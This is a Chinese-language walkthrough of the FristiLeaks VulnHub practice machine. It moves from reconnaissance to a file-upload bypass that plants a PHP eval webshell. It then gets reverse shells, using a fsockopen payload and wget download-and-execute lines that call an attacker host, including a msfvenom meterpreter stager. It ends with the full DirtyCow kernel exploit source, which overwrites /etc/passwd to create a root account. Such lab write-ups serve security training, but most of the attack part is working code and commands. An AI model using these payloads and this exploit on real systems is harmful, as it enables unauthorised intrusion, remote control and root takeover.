# (Vulnhub练习)-- fristileaks渗透实战

![image-20210926132833208](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261328565.png)

## 下载地址

```
http://www.vulnhub.com/entry/fristileaks-13,133/
```

## 目标主机IP：192.168.100.155

## 信息收集

>  信息收集的步骤基本上差不多,可根据工具简单写个shell脚本

```sh
#!/usr/bin/bash

ip=192.168.100.$1

ping -c2 $ip &>/dev/null  
if [ $? -eq 0 ] ; then 
		echo "$ip is up"
	else 
			echo "$ip is down"
			    exit
fi

masscan --rate=10000 --ports 0-65535 $ip 
masscan --rate=10000 --ports 0-65535 $ip 
nmap -A $ip
sleep 30
whatweb $ip 
sleep 10
dirsearch  -u  $ip 
sleep 5
nikto -h $ip 
sleep 5
dirb http://$ip 
```

> 我的网段在192.168.100.0/24  所以**ip**要改改

```
 /home/xiaoxiaoran/shell/xinxi.sh 155
```

![image-20210926133214687](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261332786.png)

### 泛端口扫描

![image-20210926133347087](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261333293.png)

### nmap端口扫描

![image-20210926133644284](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261336481.png)

### 指纹识别

![image-20210926133737071](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261337331.png)

### 路径扫描

![image-20210926133708625](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261337765.png)

## 开始测试

### 查看robots

```
http://192.168.100.155/robots.txt
```

![image-20210926134140865](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261341959.png)

### 访问相关页面

![3037440](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261342177.jpg)

>通过工具没有扫描出网站的可利用目录

> 查看首页的前端代码没有什么发现

> 将**主页图片**上有的单词全都尝试了一遍，拼接到链接后面；



## 在图片上的文字“fristi”中尝试成功

```
http://192.168.100.155/fristi/
```

![image-20210926134643087](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261346323.png)

## 尝试弱密码和sql注入

### burpsuite intruder

![image-20210926135238203](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261352443.png)

>  未能成功 保留post信息

```
myusername=admin&mypassword=§admin§&Submit=Login
```

### sqlmap尝试

```
sqlmap -u http://192.168.100.155/fristi/ --data "myusername=admin&mypassword=§admin§&Submit=Login"
```

![image-20210926135658898](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261356021.png)

## ctrl + u 查看源代码

![image-20210926140329306](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261403405.png)

![image-20210926135901739](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261359906.png)

```
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
```

### 加密的字符串应该是base64编码

[Base64](https://base64.us/)

![image-20210926140041788](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261400952.png)

### 加密的是一张图片

[BASE64转图片 - 站长工具 - 极速数据](https://tool.jisuapi.com/base642pic.html)

![image-20210926140146500](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261401668.png)

> 分析的用户名和密码

- eezeepz   
- keKkeKKeKKeKkEkkEk

## 登录后是文件上传

![image-20210926140650959](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261406068.png)



## 测试发现使用.php.jpg可以上传成功并执行

>  果断传一个一句话shell

```php
<?php @eval($_POST["1"]);?>
```

![image-20210926141209020](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261412121.png)

## 使用中国蚁剑链接

```
http://192.168.100.155/fristi/uploads/1.php.jpg
```

![image-20210926141327593](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261413758.png)

## 只能读取部分文件

![image-20210926143736677](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261437817.png)

## 用蚁剑虽然能够拿到shell,但还需要提权

![image-20210926143631404](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261436540.png)

### 蚁剑的终端并不能提权

![image-20210926144823127](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261448248.png)

## nc方式获取反弹shell

- Kali上写个PHP反弹shell的脚本；并开启Apache服务;存成shell.txt

  ```
  <?php $sock=fsockopen("192.168.100.143",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
  ```

- 物理机上写个下载并执行该脚本的PHP代码;存成2.php.jpg

  ```
  <?php system("wget 192.168.100.143/shell.txt -O /tmp/shell.php; php /tmp/shell.php");?>
  ```

- 在Kali上监听1234端口；浏览器去访问上传的2.php.jpg，成功获取目标的shell

  ```
  http://192.168.100.155/fristi/uploads/2.php.jpg
  ```

  ```
  nc -vnlp 1234
  ```

  ![image-20210926150357392](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261503535.png)

> 调用蚁剑直接上传也行



## msf方式获取反弹shell

- msfvenom生成木马

```
sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
```

**linux.rc文件**

```sh
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.143
set LPORT 4444
exploit
```

- 开启监听

```sh
msfconsole  -qr /home/xiaoxiaoran/shell/linux.rc  
```

- 上传3.php.jpg

```php
<?php system("wget 192.168.100.143/xiao3 -O /tmp/xiao3;cd /tmp;chmod +x xiao3;./xiao3 &")?>
```

- 浏览器去访问上传的3.php.jpg，成功获取目标的shell

```
http://192.168.100.155/fristi/uploads/3.php.jpg
```

![image-20210926210347696](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109262103969.png)

- 拿到shell

```
sysinfo
shell
python -c 'import pty;pty.spawn("/bin/bash")'  
```

![image-20210926210622943](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109262106128.png)

>  调用蚁剑直接上传也行

## 脏牛提权

- 将shell转换为交互式的tty

```sh
python -c 'import pty;pty.spawn("/bin/bash")'  
```

![image-20210926151110443](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261511565.png)

- dirty.c文件

```c
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo
{
  char *username;
  char *hash;
  int user_id;
  int group_id;
  char *info;
  char *home_dir;
  char *shell;
};

char *generate_password_hash(char *plaintext_pw)
{
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u)
{
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
                      u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
          u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg)
{
  int i, c = 0;
  for (i = 0; i < 200000000; i++)
  {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to)
{
  // check if target file already exists
  if (access(to, F_OK) != -1)
  {
    printf("File %s already exists! Please delete it and run again\n",
           to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if (source == NULL)
  {
    return -1;
  }
  target = fopen(to, "w");
  if (target == NULL)
  {
    fclose(source);
    return -1;
  }

  while ((ch = fgetc(source)) != EOF)
  {
    fputc(ch, target);
  }

  printf("%s successfully backed up to %s\n",
         from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0)
  {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2)
  {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  }
  else
  {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n", (unsigned long)map);
  pid = fork();
  if (pid)
  {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l = strlen(complete_passwd_line);
    for (i = 0; i < 10000 / l; i++)
    {
      for (o = 0; o < l; o++)
      {
        for (u = 0; u < 10000; u++)
        {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long *)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n", c);
  }
  else
  {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth, NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
         user.username, plaintext_pw);
  printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
         backup_filename, filename);
  return 0;
}
```

- 编译dirity

```
wget 192.168.100.143/dirty.c
gcc -pthread dirty.c -o exp -lcrypt
./exp 123.com
```

![image-20210926205459275](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109262054596.png)

- 得到root用户
  - firefart 
  - 123.com

![image-20210926151319375](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109261513560.png)

# flag

```
Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

**文章部分参考[橘子女侠](https://blog.csdn.net/qq_38684504/article/details/90106915)**

